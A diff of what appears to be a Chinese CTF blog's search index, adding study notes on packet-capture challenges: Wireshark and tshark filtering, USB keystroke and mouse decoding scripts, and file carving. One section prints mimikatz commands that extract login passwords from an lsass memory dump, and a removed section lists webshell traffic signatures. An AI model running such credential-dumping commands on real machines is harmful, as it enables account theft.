-<p>解码器：服务端对返回流量编码，需要客户端通过解码器解码还原流量接收 </p>
-</blockquote>
-<blockquote>
-<p>蚁剑的webshell来自菜刀，流量特征与菜刀相似</p>
-</blockquote>
-<blockquote>
-<p>蚁剑流量特征：默认UA头是antswordxxx（可改） 正文内容用URL加密，解密后流量中最明显的是ini_set(“display_errors”,”0”)</p>
-<p>这段代码基本上所有webshell工具都有，不过大部分都进行了编码，而蚁剑是明文</p>
-<p>参数名：0x……&#x3D;</p>
-</blockquote>
-<blockquote>
-<p>冰蝎：使用AES 128位对称加密的加密webshell ； Accept字段（存在于冰蝎任何一个通信阶段）</p>
-</blockquote>
-<blockquote>
-<p>哥斯拉：cookie最后一个值后面跟有;分号</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Misc</category>
-      </categories>
-      <tags>
-        <tag>流量分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
+    <title>Java漏洞学习笔记</title>
     <url>/CTF/Web/Java/</url>
     <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-WEB-INF文件夹"><a href="#1-WEB-INF文件夹" class="headerlink" title="1.WEB-INF文件夹"></a>1.WEB-INF文件夹</h3><p>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</p>
 <ul>
@@ -732,6 +240,13 @@
 <p>将回显进行base64解码即可得到flag</p>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link" href="https://blog.csdn.net/Mrs_H/article/details/119576821">https://blog.csdn.net/Mrs_H/article/details/119576821 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>漏洞学习</tag>
+        <tag>Web</tag>
+      </tags>
   </entry>
   <entry>
     <title>XSS学习</title>
@@ -1659,6 +1174,498 @@
       <tags>
         <tag>漏洞学习</tag>
         <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Misc-流量题记录</title>
+    <url>/CTF/Misc/%E6%B5%81%E9%87%8F/</url>
+    <content><![CDATA[<h2 id="Buu-9-3-1-HTTP流量分析http流量分析"><a href="#Buu-9-3-1-HTTP流量分析http流量分析" class="headerlink" title="Buu - 9.3.1 HTTP流量分析http流量分析"></a>Buu - 9.3.1 HTTP流量分析http流量分析</h2><p>下载<a class="link" href="https://files.buuoj.cn/files/6d44d2b69c7a5941a25b713dde3d903f/atta.pcapng">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，用wireshark打开，题目时http流量的分析</p>
+<p>直接过滤搜索http</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-00.png"></p>
+<p>显而易见的shell.php  &#x3D;&gt; 后门文件吧？</p>
+<p>在你觉得可疑的流量包上 右键，追踪流 http流</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-01.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-1-02.png"></p>
+<h3 id="过滤器知识点："><a href="#过滤器知识点：" class="headerlink" title="过滤器知识点："></a>过滤器知识点：</h3><p><code>http contains &#39;flag&#39;</code></p>
+<p>-&gt; 匹配http协议的 且 流量包中含有flag字符的</p>
+<hr>
+<h2 id="安洵杯-2019-Attack-压缩包"><a href="#安洵杯-2019-Attack-压缩包" class="headerlink" title="[安洵杯 2019]Attack [ 压缩包 ]"></a>[安洵杯 2019]Attack [ 压缩包 ]</h2><p>用wireshark打开，过滤器语句<code> http contains &quot;flag&quot;</code>看看有没有结果：</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-00.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-01.png"></p>
+<p>有结果肯定要追踪http流，（我自己做的时候只关注到了flag.txt）却没关注到 PK（zip压缩包的标志）</p>
+<p><del>我的第一想法肯定要将它给拿出来进行分离zip获得flag.txt的</del></p>
+<p>但看了Wp：直接分离这个流量包（附件）即可：用kali中的工具<code>foremost -T Attack.pcap</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-03.png"></p>
+<p>获得zip压缩包，但是有加密，这个压缩包的 属性 -&gt; 注释  中提示信息，指向了管理员的密码</p>
+<p>哪里获取管理员密码呢，看Wp说是 dmp文件</p>
+<blockquote>
+<p>dmp后缀文件是windows系统中的错误转储文件，当windows发生错误蓝屏的时候，系统将当前内存[含虚拟内存]中数据直接写到这类文件中去，方便定位故障原因。 里面包含了主机用户密码信息</p>
+</blockquote>
+<p>经过过滤器，发现是有dmp的信息的 [ 之后感觉我这个过滤语句不太好，dmp只是三个字符而已，有可能出现偶尔情况，加个. ] [我不知道通配符是什么，我试了 <code>*.dmp</code> 没结果]</p>
+<p>发现有，就导出</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-05.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-02.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-04.png"></p>
+<p>接下来需要用到工具 <code>mimikatz</code> 下载链接</p>
+<p><a class="link" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>具体用法我也不知道。关于这个题：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">//载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">//读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-2-06.png" alt="4-2-06"></p>
+<p>我不知道为什么 我输入提升权限的那句代码会报错，</p>
+<p>但是输入后面的代码正常运行。</p>
+<p>然后就会看到密码了。Password：</p>
+<h2 id="NewStarCTF-公开赛赛道-最后的流量分析-tshark"><a href="#NewStarCTF-公开赛赛道-最后的流量分析-tshark" class="headerlink" title="[NewStarCTF 公开赛赛道]最后的流量分析 [ tshark ]"></a>[NewStarCTF 公开赛赛道]最后的流量分析 [ tshark ]</h2><p><a class="link" href="http://linux.51yip.com/search/tshark">tshark的使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><code>tshark -r sqli.pcap -T fields -Y &quot;http.request.method==GET or frame.len&gt;765&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt</code></p>
+<blockquote>
+<p>-r 解析的流量文件</p>
+<p>-T 指定输出的格式，fields &#x3D;&gt; 只输出符合条件的字段</p>
+<p>-Y 用于过滤流量包 &#x3D;&gt; 上面的-Y表示 只取GET方法的或者流量包长度大于765的</p>
+<p>-e 要输出的字段 &#x3D;&gt; 上面的-e表示 输出流量包长度以及流量包中uri中的参数</p>
+<p>&gt; 重定向，这里表示将输出的东西 重定向到一个data.txt文件内</p>
+</blockquote>
+<p>第一次用这个tshark 看手册吧.</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">comment = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\CTF\data.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	lines = f.readlines() <span class="comment"># 读取txt文件中的每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):	<span class="comment"># len(lines)-&gt;读取的行数</span></span><br><span class="line">		<span class="comment"># print(lines[i])</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">int</span>(lines[i][:<span class="number">3</span>])&gt;<span class="number">765</span>:</span><br><span class="line">			comment += re.findall(<span class="string">r&#x27;&quot;(.)&quot;&#x27;</span>, unquote(lines[i-<span class="number">1</span>]))[<span class="number">0</span>]	<span class="comment"># 观察得到的txt文本，当出现&gt;768的行数，上一行双引号中的内容就是flag的值 =&gt; 正是因为我们观察到了这个，才通过python来得到这个内容</span></span><br><span class="line"><span class="comment"># unquote -&gt; 解码url编码的字符串</span></span><br><span class="line"><span class="comment"># r&#x27;&#x27; -&gt; 将转义字符当做普通字符</span></span><br><span class="line"><span class="comment"># . 通配符</span></span><br><span class="line"><span class="built_in">print</span>(comment)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="NSS-鹤城杯-2021-流量分析"><a href="#NSS-鹤城杯-2021-流量分析" class="headerlink" title="NSS - [鹤城杯 2021]流量分析"></a>NSS - [鹤城杯 2021]流量分析</h2><p>打开wireshark，看到是sql注入的信息，这题我熟，刚做过。就去用tshark了，但是看了眼wp，直接在这个导出页面找就行！</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-00.png"></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">119</span>,<span class="number">49</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">75</span>,<span class="number">95</span>,<span class="number">101</span>,<span class="number">122</span>,<span class="number">95</span>,<span class="number">49</span>,<span class="number">115</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">125</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">59</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    result += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag : &quot;</span> + result)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="USB流量-键盘流量"><a href="#USB流量-键盘流量" class="headerlink" title="USB流量 - 键盘流量"></a>USB流量 - 键盘流量</h2><p><a class="link" href="https://wuyong.lanzout.com/ihBPQ0uug8id">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>            <a class="link" href="https://blog.csdn.net/ON_Zero/article/details/130528679">参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>用tshark获取其中的数据</p>
+<p><code>tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p>
+<p>-&gt; -r 是要解析的文件名</p>
+<p>-&gt; -T 是选择以什么形式输出  &#x3D;&gt; fields 以字段形式输出，意味着只显示捕获数据中的特定字段，而不是整个数据包</p>
+<p>-&gt; -e usb.capdata 告诉tshark输出与USB相关的数据，</p>
+<p>-&gt; | 这是一个管道符，它将tshark输出传递给 sed命令</p>
+<p>-&gt; sed是流编辑器，用于处理文本流，后面这个 &#x2F;^\s*$&#x2F;d 是正则表达式，删除所有空行</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-00.png"></p>
+<p>将获取到的数据没两个之间用:隔开</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给每一行的数据 俩俩 用冒号隔开</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\键盘\\usbdata.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\CTF\\Misc流量\\键盘\\out.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取每一行 进行去空，</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        a[i] = a[i].strip()</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">        <span class="comment"># if a[i]:</span></span><br><span class="line">            <span class="comment"># print(len(a[i]))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a[i]) == <span class="number">16</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;[*] Success &#123;i&#125;&quot;)</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a[i]), <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> j+<span class="number">2</span> != <span class="built_in">len</span>(a[i]):</span><br><span class="line">                    out += a[i][j] + a[i][j+<span class="number">1</span>] + <span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out += a[i][j] + a[i][j+<span class="number">1</span>]</span><br><span class="line">            f1.write(out)</span><br><span class="line">            f1.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+
+<p>将文中的数据还原成键位</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#最后用脚本提取  键盘数据 -&gt; 字符</span></span><br><span class="line">   <span class="comment"># print((line[6:8])) #输出6到8之间的值</span></span><br><span class="line">   <span class="comment">#取出6到8之间的值</span></span><br><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\键盘\\out.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)) </span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-01.png"></p>
+<blockquote>
+<p>flag{7200[DEL]53[DEL]93}</p>
+</blockquote>
+<h2 id="USB流量-鼠标数量"><a href="#USB流量-鼠标数量" class="headerlink" title="USB流量 - 鼠标数量"></a>USB流量 - 鼠标数量</h2><p>先用tshark获取</p>
+<p><code>tshark -r usb2.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p>
+<p>将数据通过：分隔开</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将上面的文件用脚本分隔，加上冒号；</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\桌面\\CTF\\Misc流量\\鼠标\\usbdata.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\桌面\\CTF\\Misc流量\\鼠标\\out.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  a=f.readline().strip()</span><br><span class="line">  <span class="keyword">if</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:<span class="comment">#键盘流量的话len为16鼠标为8 </span></span><br><span class="line">      out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>] </span><br><span class="line">      f1.write(out) </span><br><span class="line">      f1.write(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">    <span class="keyword">break</span> </span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure></div>
+
+<p>通过脚本转换成图片</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">2000</span>,<span class="number">2000</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))<span class="comment">#创建Image对象</span></span><br><span class="line">f =<span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\CTF\Misc流量\鼠标\out1.txt&quot;</span>)<span class="comment">#xy.txt文件 </span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point =line.split()</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(point[<span class="number">0</span>]),<span class="built_in">int</span>(point[<span class="number">1</span>])),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">#读取文件中的每一行，并修改像素 </span></span><br><span class="line">f.close() </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-02.png"></p>
+<p>还可以通过gnuplot软件来生成图形，（windows和linux均可，都可以下载）</p>
+<p>我是在windows下安装的，是个 exe软件，打开之后 </p>
+<p>plot ‘filepath’</p>
+<p>我是直接放在当前目录了 </p>
+<p>生成之后用画图软件翻转一下即可</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-03.png"></p>
+<hr>
+<h2 id="Buu-TLS流量分析"><a href="#Buu-TLS流量分析" class="headerlink" title="Buu - TLS流量分析"></a>Buu - TLS流量分析</h2><p><a class="link" href="https://zhuanlan.zhihu.com/p/32059190">了解学习OSI模型TCP&#x2F;IP模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>      <a class="link" href="https://www.jianshu.com/p/c793a279f698">了解学习OSI模型TCP&#x2F;IP模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a href="SSL/TLS%E4%BC%9A%E8%AF%9D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">学习 SSL&#x2F;TLS会话流量分析</a></p>
+<p>过滤http流量</p>
+<p>发现有个数据包中有个log文件</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-00.png"></p>
+<p>保存到本地为1.log，然后导入TLS的秘钥中</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-01.png"></p>
+<p>再过滤http流量，发现多了一些流量，然后其中有一个保存有flag</p>
+<h2 id="Buu-神比流量"><a href="#Buu-神比流量" class="headerlink" title="Buu - 神比流量"></a>Buu - 神比流量</h2><p>用Wireshark打开发现是USB数据；其中有一个数据包隐藏了7z文件</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-03.png"></p>
+<p>选中 as a Hex Stream &#x3D;&gt; 在记事本中粘贴看看有没有问题</p>
+<p>从37 7a开始选中，用脚本写入到.7z文件中</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata = <span class="string">&#x27;377abcaf271c00044aaed88750000000000000006a000000000000002d108d3939dc5abb57f2606b99b18fb7518aa378d2dcfed3f7a197d4e752b6156b026bf975d5fa5c37618bdfe2c567592e7128e139c1a6ac4e9eed598dd3398c03c16a35502e827004852aae6a7342214fa901c30104060001095000070b0100022406f107010a5307ef3e981518c6bd122121010001000c4a4600080a011a4cdb8a00000501190900000000000000000011130066006c00610067002e0074007800740000001900140a010066629f3bc46cd801150601002000000000000600313233343536&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\flag.7z&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></figure></div>
+
+<p>得到7z文件，发现其中的文件需要解密，用010打开7z文件，文末藏有密码123456</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-02.png"></p>
+<p>打开flag.txt文件，是一个谷歌云盘的下载地址，下载下来之后，依然是一个压缩包（main.exe文件 和 out.txt文件），密码尝试一下123456成功</p>
+<p>接下来不会了。看官方Wp（需要逆向分析exe文件 是进行了Xor运算）</p>
+<p><a class="link" href="https://cloud.tencent.com/developer/article/2088394">官方Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="NSSCTF-NISACTF-2022-流量包里有个熊"><a href="#NSSCTF-NISACTF-2022-流量包里有个熊" class="headerlink" title="NSSCTF - [NISACTF 2022]流量包里有个熊"></a>NSSCTF - [NISACTF 2022]流量包里有个熊</h2><p>用wireshark打开，发现有个jpg图片</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-02.png"></p>
+<p>将值弄出来放在文本中，用脚本写到图片中 [ 我不会直接将其复制在010中 ]</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这里的hexdata太长了，就不粘贴了</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\\OneDrive\\桌面\\test.jpg&#x27;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(unhexlify(hexdata)) <span class="comment"># unhexlify将十六进制数据转换为二进制数据</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后对图片binwalk分离一下</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-03.png"></p>
+<p>一个压缩包，一个flag.txt，一个图片</p>
+<p>肯定先看flag，是base64加密，解密一下发现是假的</p>
+<p>然后打开压缩包</p>
+<p>最后发现了最后一个flag.txt文件，但是里面的数据看不懂，</p>
+<p>看Wp说是加密，移位的加密 rot位移密码（rot5 rot13 rot18 rot47）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-04.png"></p>
+<p><a class="link" href="https://lzltool.cn/Tools/Rot13">先将txt文本中的内容进行rot13解密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-05.png"></p>
+<p>然后就是使用刚开始的脚本将这段数据写在jpg中 [ 开头是ff d8 ff ]</p>
